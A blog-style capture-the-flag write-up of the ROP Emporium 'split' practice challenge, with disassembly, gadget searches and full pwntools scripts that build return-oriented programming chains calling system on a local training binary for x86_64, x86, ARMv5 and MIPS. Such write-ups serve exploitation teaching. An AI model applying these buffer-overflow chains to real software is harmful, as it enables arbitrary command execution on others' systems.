--- 
layout: post 
title:  "[ROP EMPORIUM] split"
date: "2021-05-5" 
tags: [pwn, ret2win, ROP-EMPORIUM] 
---

This is the second challenge of the ROP EMPORIUM series. The site tell us:
> I'll let you in on a secret; that useful string "/bin/cat flag.txt" is still present in this binary, 
  as is a call to system(). It's just a case of finding them and chaining them together to make the magic happen.

If we use radare2 for solving this challenge we can search the string inside the elf file with this command:

``` 
rabin2 -z <elf> 
```

or in pwntools with:

```python
elf = ELF('split')
useful_string = next(elf.search(b'/bin/cat flag.txt'))
``` 

Same as the previous challenge the binary asks us immediately for an input.

``` 
(.pwn) eurus@warfare:~/Documents/split_all/split$ ./split 
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> _ 
``` 


# x86_64 (64 bit) architecture

``` 
[Symbols]

nth paddr      vaddr      bind   type   size lib name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
35  0x000006e8 0x004006e8 LOCAL  FUNC   90       pwnme
36  0x00000742 0x00400742 LOCAL  FUNC   17       usefulFunction
66  0x00000697 0x00400697 GLOBAL FUNC   81       main
``` 

Here we have the *pwnme* function and function called *usefulFuntion*. The pwnme function is the usual function that take an input 
with a read that take as input a number of bytes greater than the size of the buffer.

And here we have the disassebled if the usefulFunction:

```asm
┌ 17: sym.usefulFunction ();
│           0x00400742      55             push rbp
│           0x00400743      4889e5         mov rbp, rsp
│           0x00400746      bf4a084000     mov edi, str._bin_ls        ; 0x40084a ; "/bin/ls" ; const char *string
│           0x0040074b      e810feffff     call sym.imp.system         ; int system(const char *string)
│           0x00400750      90             nop
│           0x00400751      5d             pop rbp
└           0x00400752      c3             ret
``` 

This function as the ret2win function of the previous challenge it is never called. This function execute the system function with as argument
the string '/bin/ls'.

In the x86_64 architectures the argument of the function are passed trough the register, as we can se here. The address where the string '/bin/ls'
is stored inside the elf file is placed inside the edi register, then the system function is called.

**In a 64bit Linux machine Function parameters go in registers rdi, rsi, rdx, rcx, r8, and r9.  Any additional parameters get pushed on the stack.**

So, first of all we need to find our '/bin/cat flag.txt' string. Then we need to place that string into the edi register and after call the system
function at 0x0040074b.

First, find the string using  
``` 
rabin2 -z split 
``` 
this is the result:

``` 
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
``` 

So at 0x00601060 we have our precious string '/bin/cat flag.txt' we need to find a way to place the address 0x00601060 inside the rdi register.

We can search for some gadgets using ropper

``` 
(.pwn) eurus@warfare:~/Documents/split_all/split$ ropper -f split --search 'pop rdi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x00000000004007c3: pop rdi; ret; 
``` 

So now we have an useful gadget that place an address from the stack into te rdi register. We have all that we need in order
to win this challenge! I will not show again how we can find the offset I have alredy show [here](https://tizianocolagrossi.github.io/rop-emporium-ret2win/)
In this case we have an offset of 40 bytes


``` python
from pwn import *

context.binary = elf = ELF('./split')
offset = 40

flag_string = 0x601060
pop_rdi     = 0x4007c3
call_system = 0x40074b

payload = b'c'*offset+p64(pop_rdi)+p64(flag_string)+p64(call_system)

p = elf.process()
p.recv()
p.sendline(payload)
log.info(p.recvall())
```

We can see that here in the payload we are creating a little rop chain. First we place the address of the pop_rdi gadget that will pop the value 
on the stack (placed right after) into the rdi register, than return to call_system function.


```
after our payload
               ret
[buffer ][ebp][pop_rdi][cat_flag_pointer][call_system]

we return from the pwnme and we pop the saved rip 
(that now contains the address of the gadget pop rdi)

so the stack is like this and rip point to pop rdi
[cat_flag_pointer][call_system]

now we have rdi = cat_flag_pointer
and the stack is arranged like this

[call_system]

now we execute the ret of the gadget
and we jump into call_system with 
rdi set to /bin/cat/flag
```


# x86 (32 bit) architecture
The main difference here is that in this architecture the argument to the function are passed trough the stack.
We have an offset of 44 bytes [here](https://tizianocolagrossi.github.io/rop-emporium-ret2win/) I show how this offset can be found.

This is the disassebly of the usefulFunction in split32:

```asm
┌ 25: sym.usefulFunction ();
│           0x0804860c      55             push ebp
│           0x0804860d      89e5           mov ebp, esp
│           0x0804860f      83ec08         sub esp, 8
│           0x08048612      83ec0c         sub esp, 0xc
│           0x08048615      680e870408     push str._bin_ls            ; 0x804870e ; "/bin/ls" ; const char *string
│           0x0804861a      e8c1fdffff     call sym.imp.system         ; int system(const char *string)
│           0x0804861f      83c410         add esp, 0x10
│           0x08048622      90             nop
│           0x08048623      c9             leave
└           0x08048624      c3             ret
```

Here we have the **system function at 0x0804861a** and the pointer to the string '/bin/ls' is placen into the stack. So in this case 
we don't need a gadget we just need to append the address of the string '/bin/cat flag.txt' after the address of the system function.


```
[0x08048430]> rabin2 -z split32
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006b0 0x080486b0 21  22   .rodata ascii split by ROP Emporium
1   0x000006c6 0x080486c6 4   5    .rodata ascii x86\n
2   0x000006cb 0x080486cb 8   9    .rodata ascii \nExiting
3   0x000006d4 0x080486d4 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!
5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls
0   0x00001030 0x0804a030 17  18   .data   ascii /bin/cat flag.txt
```

The string '/bin/cat flag.txt' is placed at 0x0804a030. We have all that we need in order to win this challenge.


```python
from pwn import *
context.binary = elf = ELF('./split32')
offset = 44

call_system = 0x804861a
flag_string = 0x804a030

payload = b'c'*offset+p32(call_system)+p32(flag_string) 

p = elf.process()
p.recv()
p.sendline(payload)
log.info(p.recvall())
```


# ARMv5 (32 bit) architecture
In this architectures the calling convenction define that r0 to r3 registers contains argument values passed to a subroutine 
and results returned from a subroutine. So also here we must place the address of the string '/bin/cat flag.txt' inside of a register.


```
[0x00010428]> rabin2 -z split_armv5
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000660 0x00010660 21  22   .rodata ascii split by ROP Emporium
1   0x00000678 0x00010678 6   7    .rodata ascii ARMv5\n
2   0x00000680 0x00010680 8   9    .rodata ascii \nExiting
3   0x0000068c 0x0001068c 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x000006bc 0x000106bc 10  11   .rodata ascii Thank you!
5   0x000006c8 0x000106c8 7   8    .rodata ascii /bin/ls
0   0x0000103c 0x0002103c 17  18   .data   ascii /bin/cat flag.txt
```
We have the string at 0x0002103c and from the disassebly we can see the address where the system function is called (0x105e0) and
that the address of the sting is placed inside the r0 register.

```asm
[0x00010428]> pdf @ sym.usefulFunction 
┌ 24: sym.usefulFunction ();
│           ; var int32_t var_4h @ sp+0x4
│           0x000105d4      00482de9       push {fp, lr}
│           0x000105d8      04b08de2       add fp, var_4h
│           0x000105dc      08009fe5       ldr r0, [str._bin_ls]       ; [0x106c8:4]=0x6e69622f ; "/bin/ls" ; const char *string
│           0x000105e0      81ffffeb       bl sym.imp.system           ; int system(const char *string)
│           0x000105e4      0000a0e1       mov r0, r0                  ; 0x106c8 ; "/bin/ls"
└           0x000105e8      0088bde8       pop {fp, pc}
```

So in order to place the addres of '/bin/cat flag.txt' into r0 we need a gadget. But unfortunately we don't have a gadget that direct puts
the calue into r0.

Those are all the gadget that ropper can find.

```
Gadgets
=======


0x00010624: add r4, r4, #1; ldr r3, [r5], #4; mov r2, sb; mov r1, r8; mov r0, r7; blx r3; 
0x00010390: andeq r0, r0, r6, lsl r5; andeq r1, r2, ip, lsr #32; andeq r0, r0, r6, lsl r8; push {r3, lr}; bl #0x464; pop {r3, pc}; 
0x00010398: andeq r0, r0, r6, lsl r8; push {r3, lr}; bl #0x464; pop {r3, pc}; 
0x00010648: andeq r0, r1, r0, lsl sb; andeq r0, r1, r8, lsl #18; bx lr; 
0x00010648: andeq r0, r1, r0, lsl sb; andeq r0, r1, r8, lsl #18; bx lr; push {r3, lr}; pop {r3, pc}; 
0x0001064c: andeq r0, r1, r8, lsl #18; bx lr; 
0x0001064c: andeq r0, r1, r8, lsl #18; bx lr; push {r3, lr}; pop {r3, pc}; 
0x00010394: andeq r1, r2, ip, lsr #32; andeq r0, r0, r6, lsl r8; push {r3, lr}; bl #0x464; pop {r3, pc}; 
0x000104c8: asrs r1, r1, #1; bxeq lr; ldr r3, [pc, #0x10]; cmp r3, #0; bxeq lr; bx r3; 
0x000103a0: bl #0x464; pop {r3, pc}; 
0x00010500: bl #0x488; mov r3, #1; strb r3, [r4]; pop {r4, pc}; 
0x00010638: blx r3; 
0x00010640: bne #0x624; pop {r4, r5, r6, r7, r8, sb, sl, pc}; andeq r0, r1, r0, lsl sb; andeq r0, r1, r8, lsl #18; bx lr; 
0x00010650: bx lr; 
0x00010650: bx lr; push {r3, lr}; pop {r3, pc}; 
0x000104a4: bx r3; 
0x000104a0: bxeq lr; bx r3; 
0x00010494: bxeq lr; ldr r3, [pc, #0x10]; cmp r3, #0; bxeq lr; bx r3; 
0x0001049c: cmp r3, #0; bxeq lr; bx r3; 
0x000104f8: cmp r3, #0; popne {r4, pc}; bl #0x488; mov r3, #1; strb r3, [r4]; pop {r4, pc}; 
0x00010490: cmp r3, r0; bxeq lr; ldr r3, [pc, #0x10]; cmp r3, #0; bxeq lr; bx r3; 
0x0001063c: cmp r6, r4; bne #0x624; pop {r4, r5, r6, r7, r8, sb, sl, pc}; andeq r0, r1, r0, lsl sb; andeq r0, r1, r8, lsl #18; bx lr; 
0x00010498: ldr r3, [pc, #0x10]; cmp r3, #0; bxeq lr; bx r3; 
0x00010628: ldr r3, [r5], #4; mov r2, sb; mov r1, r8; mov r0, r7; blx r3; 
0x00010634: mov r0, r7; blx r3; 
0x00010630: mov r1, r8; mov r0, r7; blx r3; 
0x0001062c: mov r2, sb; mov r1, r8; mov r0, r7; blx r3; 
0x00010504: mov r3, #1; strb r3, [r4]; pop {r4, pc}; 
0x000103a4: pop {r3, pc}; 
0x0001050c: pop {r4, pc}; 
0x00010644: pop {r4, r5, r6, r7, r8, sb, sl, pc}; andeq r0, r1, r0, lsl sb; andeq r0, r1, r8, lsl #18; bx lr; 
0x00010644: pop {r4, r5, r6, r7, r8, sb, sl, pc}; andeq r0, r1, r0, lsl sb; andeq r0, r1, r8, lsl #18; bx lr; push {r3, lr}; pop {r3, pc}; 
0x000104fc: popne {r4, pc}; bl #0x488; mov r3, #1; strb r3, [r4]; pop {r4, pc}; 
0x0001039c: push {r3, lr}; bl #0x464; pop {r3, pc}; 
0x00010654: push {r3, lr}; pop {r3, pc}; 
0x00010508: strb r3, [r4]; pop {r4, pc}; 
```

```
0x00010634: mov r0, r7; blx r3;
```

but we can create a rop chain that insert into r0 the value stored into r7 and after the mov blx into r3 (blx branch link exchange 
basically junp to the address contained into r3 and then return to the instruction after this).

so now we need to place the value of the strin into r7 and then exploit the blx in order to jump to the call system and so we need to insert into
r3 the address of where the system function is called.

```
0x000103a4: pop {r3, pc};
0x00010644: pop {r4, r5, r6, r7, r8, sb, sl, pc}
```

with this two gadget we can insert a value into r7 and into r3.

we have all that we need to complete the challenge now!


```python
from pwn import *
context.binary = elf = ELF('./split_armv5')
offset = 36

call_system = 0x105e0
mov_r0_r7_blx_r3 = 0x10634
pop_r4_r5_r6_r7_r8_sb_sl_pc = 0x10644
flag_string = 0x2103c
pop_r3_pc = 0x000103a4

payload = b'A'*offset
payload += p32(pop_r3_pc) # because after with a gadget blx r3 
payload += p32(call_system)

# here after all pop jump to pc!
payload += p32(pop_r4_r5_r6_r7_r8_sb_sl_pc)
payload += p32(0x4) # r4
payload += p32(0x5) # r5
payload += p32(0x6) # r6
payload += p32(flag_string) ## r7 then moved to r0
payload += p32(0x8) # r8
payload += p32(0x9) # sb
payload += p32(0xaa)# sl
payload += p32(mov_r0_r7_blx_r3) # pc so jump here and then into system

p = elf.process()
#p = gdb.debug('./split_armv5')


p.recv()
p.sendline(payload)
log.info(p.recvall())
```

# mipsel (32 bit) architecture
Here we can see from the disassebly of the usefulFunction the parameter are placed into reserved register by the calling convenction 
(all the aX registers), here the string is placed inside the a0 register.


```asm
[0x00400690]> pdf @ sym.usefulFunction 
┌ 84: sym.usefulFunction (int32_t arg1, int32_t arg_10h);
│           ; arg int32_t arg_10h @ fp+0x10
│           ; var int32_t var_10h @ sp+0x10
│           ; var int32_t var_18h @ sp+0x18
│           ; var int32_t var_1ch @ sp+0x1c
│           ; arg int32_t arg1 @ a0
│           0x004009c8      e0ffbd27       addiu sp, sp, -0x20
│           0x004009cc      1c00bfaf       sw ra, (var_1ch)
│           0x004009d0      1800beaf       sw fp, (var_18h)
│           0x004009d4      25f0a003       move fp, sp
│           0x004009d8      42001c3c       lui gp, 0x42                ; 'B'
│           0x004009dc      30909c27       addiu gp, gp, -0x6fd0
│           0x004009e0      1000bcaf       sw gp, (var_10h)
│           0x004009e4      4000023c       lui v0, 0x40                ; '@'
│           0x004009e8      880c4424       addiu a0, v0, 0xc88         ; 0x400c88 ; "/bin/ls" ; arg1 ; str._bin_ls
│           0x004009ec      5480828f       lw v0, -sym.imp.system(gp)  ; [0x411084:4]=0x400b70 sym.imp.system
│           0x004009f0      25c84000       move t9, v0
│           0x004009f4      09f82003       jalr t9
│           0x004009f8      00000000       nop
│           0x004009fc      1000dc8f       lw gp, (var_10h)
│           0x00400a00      00000000       nop
│           0x00400a04      25e8c003       move sp, fp
│           0x00400a08      1c00bf8f       lw ra, (var_1ch)
│           0x00400a0c      1800be8f       lw fp, (var_18h)
│           0x00400a10      2000bd27       addiu sp, sp, 0x20
│           0x00400a14      0800e003       jr ra
└           0x00400a18      00000000       nop
```

```
[0x00400690]> rabin2 -z split_mipsel
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000c20 0x00400c20 21  22   .rodata ascii split by ROP Emporium
1   0x00000c38 0x00400c38 5   6    .rodata ascii MIPS\n
2   0x00000c40 0x00400c40 8   9    .rodata ascii \nExiting
3   0x00000c4c 0x00400c4c 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x00000c7c 0x00400c7c 10  11   .rodata ascii Thank you!
5   0x00000c88 0x00400c88 7   8    .rodata ascii /bin/ls
0   0x00001010 0x00411010 17  18   .data   ascii /bin/cat flag.txt
```
Here we have the string at 0x00411010 address and the system function is called at 0x004009ec. So we need to place a value into a0 and
then jump where the system is called.

Here i looked for a gadget with radare because ropgadget wasn't find gadget useful. So with the command **/R lw** I finally found this gadget.
This gadget could be found also by reading the symbols of the file it is placed into **loc.usefulGadget**.
This gadget take from the stack the value for the registers a0 and t9 and then jump into the value of t9.

Now we just need to create our payload.

```asm
0x00400a20           0800a48f  lw a0, 8(sp)
0x00400a24           0400b98f  lw t9, 4(sp)
0x00400a28           09f82003  jalr t9
0x00400a2c           00000000  nop
```

This is the script that i created for this challenge:

```python
from pwn import *
context.binary = elf = ELF('./split_mipsel')

flag_string = 0x00411010
call_system = 0x004009ec
a0_8sp_t9_4sp_jmpt9 = 0x00400a20

offset = 36
payload = b'A'*36 + p32(a0_8sp_t9_4sp_jmpt9)+p32(0x1)+p32(call_system)+p32(flag_string)

p = elf.process()
#p = gdb.debug(elf.path)

p.recv()
p.sendline(payload)
log.info(p.recvall())

```



